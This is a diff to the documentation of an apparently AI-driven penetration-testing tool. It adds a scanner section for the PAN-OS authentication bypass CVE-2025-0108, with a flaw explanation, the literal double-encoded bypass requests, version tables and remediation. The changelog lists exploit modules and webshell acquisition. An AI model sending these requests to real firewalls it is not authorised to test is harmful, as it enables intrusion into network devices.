@@ -2518,6 +2518,145 @@ Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testi
 
 ---
 
+### PAN-OS Auth Bypass — PanOSAuthBypassScanner (v2.1)
+
+> **Research basis:**
+> Assetnote / Searchlight Cyber — Adam Kues (February 12, 2025)
+> "Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)"
+> https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/
+>
+> **Module:** `bingo/tools/panos_auth_bypass.py` — Skill #61 PanOSAuthBypassScanner
+
+---
+
+#### The Architecture: Three-Layer Authentication
+
+PAN-OS management interface uses a **Nginx → Apache → PHP** pipeline where
+authentication is decided at the Nginx layer and passed downstream via HTTP header:
+
+```
+Client Request
+    │
+    ▼ Nginx  ──── checks URI against allowlist ──► X-pan-AuthCheck: on/off
+    │              /unauth/* → AuthCheck=off
+    ▼ Apache ──── applies RewriteRule → internal redirect → double-decode URL
+    │
+    ▼ PHP    ──── executes if AuthCheck=off (no credential check)
+```
+
+The critical flaw: Nginx and Apache **parse the same URL differently**.
+Authentication is set at Nginx based on what Nginx sees, but code executes based
+on what Apache resolves after its own URL processing.
+
+---
+
+#### The Bug: Double URL Decode via Apache mod_rewrite
+
+Apache's per-directory `RewriteRule` triggers an **internal redirect**, which
+causes the URL to be decoded a second time:
+
+| Step | Who | URL state |
+|------|-----|-----------|
+| Attacker sends | — | `/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css` |
+| Nginx decodes once | Nginx | `/unauth/%2e%2e/php/...` → no `..` → **AuthCheck=off** |
+| Apache receives | Apache | Same raw URL, decodes once → `%2e%2e` still encoded |
+| RewriteRule match | Apache | `/PAN_help/x.css` matches → **internal redirect** |
+| Redirect re-decodes | Apache | `%2e%2e` → `..` (traversal appears!) |
+| Path normalize | Apache | `/unauth/../php/ztp_gate.php` → `/php/ztp_gate.php` |
+| PHP executes | PHP | AuthCheck=off → **runs with no authentication** ✅ |
+
+**The single attack request:**
+
+```http
+GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
+Host: [PAN-OS management interface]
+```
+
+---
+
+#### Affected Versions
+
+| Branch | Vulnerable | Patched |
+|--------|-----------|---------|
+| PAN-OS 10.2.x | < 10.2.14 | **10.2.14+** |
+| PAN-OS 11.0.x | < 11.0.7  | **11.0.7+** |
+| PAN-OS 11.2.x | < 11.2.5  | **11.2.5+** |
+
+---
+
+#### Impact
+
+| Scenario | Severity | CVSS |
+|----------|----------|------|
+| Auth bypass alone | CRITICAL | 9.3 |
+| + CVE-2024-9474 privilege escalation chain | CRITICAL | **9.9** |
+| Management config disclosure | HIGH | 8.5 |
+
+The RCE chain mirrors CVE-2024-0012 (prior exploit widely used in the wild).
+
+---
+
+#### What bingo Tests (Skill #61)
+
+```
+1. PAN-OS Management Interface Fingerprint (VERIFIED)
+   ├── /php/login.php  → PAN-OS login page
+   ├── /global-protect/login.esp
+   ├── x-pan-* response headers
+   ├── HTML body: "GlobalProtect", "Palo Alto Networks"
+   └── Port 443 / 4443 / 8443 probing
+
+2. Version Extraction (VERIFIED)
+   └── Regex: pan-os[\s/v]+(\d+\.\d+\.\d+) → vulnerable range check
+
+3. CVE-2025-0108 Auth Bypass Test (VERIFIED)
+   ├── /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
+   ├── /unauth/%252e%252e/php/login.php/PAN_help/x.css
+   ├── /unauth/%252e%252e/php/errors.php/PAN_help/x.js
+   └── /unauth/%252e%252e/php/php_session.php/PAN_help/x.html
+       → HTTP 200 + PHP body (not login redirect) = BYPASS CONFIRMED
+
+4. RCE Chain Assessment (LIKELY)
+   └── auth_bypass_confirmed → rce_chain_possible flag
+       (CVE-2025-0108 + CVE-2024-9474 combination)
+```
+
+---
+
+#### Evidence Levels
+
+| Finding | Evidence Level | CVSS |
+|---------|---------------|------|
+| PAN-OS interface detected | VERIFIED | INFO |
+| Vulnerable version | VERIFIED | 7.5 |
+| Auth bypass confirmed | VERIFIED | 9.3 |
+| RCE chain possible | LIKELY | 9.9 |
+
+---
+
+#### AI Auto-Selection Criteria
+
+bingo automatically activates Skill #61 when:
+- Port 443 or 4443 returns PAN-OS management interface HTML
+- Response body contains "GlobalProtect" or "Palo Alto Networks"
+- `/php/login.php` returns HTTP 200 with PAN-OS content
+- `x-pan-*` response headers are detected
+
+---
+
+#### Remediation
+
+| Action | Priority |
+|--------|----------|
+| Upgrade to **PAN-OS 10.2.14+** (10.2.x branch) | CRITICAL |
+| Upgrade to **PAN-OS 11.0.7+** (11.0.x branch) | CRITICAL |
+| Upgrade to **PAN-OS 11.2.5+** (11.2.x branch) | CRITICAL |
+| **Restrict management interface to trusted IPs** | CRITICAL |
+| Remove management interface from internet exposure | CRITICAL |
+| Apply Palo Alto advisory PAN-273971 compensating controls | HIGH |
+
+---
+
 ### Prompt Cache Optimizer — Three-Breakpoint Architecture (v2.1)
 
 > **Research basis:**
@@ -2531,7 +2670,7 @@ Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testi
 
 Every time bingo executes a pipeline step, it sends a message to the AI. Without caching,
 the entire static system prompt (≈20,000 characters) and skill definitions (60 skills) are
-re-sent from scratch on **every single step**. For a 26-step pipeline run, this wastes:
+re-sent from scratch on **every single step**. For a 27-step pipeline run, this wastes:
 
 ```
 25 steps × 20,000-char system prompt = 500,000 characters re-sent (every time)
@@ -2549,7 +2688,7 @@ The prompt is divided into three cacheable segments, each with its own cache bre
 | Breakpoint | Content | Change Frequency | Cache Effect |
 |-----------|---------|-----------------|-------------|
 | **BP1** | `UNIVERSAL_PENTEST_CORE` + model-specific instructions | Almost never | Cached for the entire session (day) |
-| **BP2** | Warmup history + 60 skill definitions | Only on new skill releases | Cached until skill list changes |
+| **BP2** | Warmup history + 61 skill definitions | Only on new skill releases | Cached until skill list changes |
 | **BP3** | Conversation history (last 12 turns) | Every turn | Sliding window — previous turns re-cached |
 
 ```
@@ -2649,11 +2788,12 @@ Anthropic cache TTL: 5 minutes (refreshed on each read). DeepSeek: automatic, no
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **60 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59), ApacheDruidSSRF (#60)
+- **61 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59), ApacheDruidSSRF (#60), PanOSAuthBypass (#61)
 - **Prompt Cache Optimizer** — Three-Breakpoint Architecture (BP1/BP2/BP3) + Relocation Trick + Frozen Datetime; ~70% API cost reduction for 26-step pipelines
 - **CloudflareACMEBypass (#58)** — ACME HTTP-01 fail-open WAF bypass detection; origin server fingerprinting, LFI, Spring Actuator, header-based attack vector testing via /.well-known/acme-challenge/* path
 - **React2ShellWafBypass (#59)** — CVE-2025-55182 pre-auth RCE attack surface detection + 5 multipart grammar un-equivalence WAF bypass techniques (BP1–BP5, total $170k bounty); safe probe + Burp-ready PoC curl generation
-- **26-step exploit pipeline** — added Phase 26 ApacheDruidSSRF (CVE-2025-27888) after Phase 25 React2ShellWafBypass
+- **27-step exploit pipeline** — added Phase 27 PanOSAuthBypass (CVE-2025-0108) after Phase 26 ApacheDruidSSRF
+- **61 skill modules** — PanOSAuthBypass (#61): Nginx/Apache double-decode path traversal auth bypass in PAN-OS
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
